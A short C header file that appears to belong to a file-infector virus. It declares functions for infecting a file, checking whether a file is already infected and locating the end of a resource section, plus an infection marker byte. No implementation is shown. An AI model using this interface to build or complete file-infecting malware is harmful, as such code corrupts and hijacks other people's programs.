
#ifndef _FILE_INFECT_H__
#define _FILE_INFECT_H__

#define FILE_INFECT_FLAG 0xFB

void file_infect(char* file_path,char* output_decrypt_file_md5);
bool file_is_infect(char* file_path);

unsigned int file_get_end_rsrc(void);

#endif
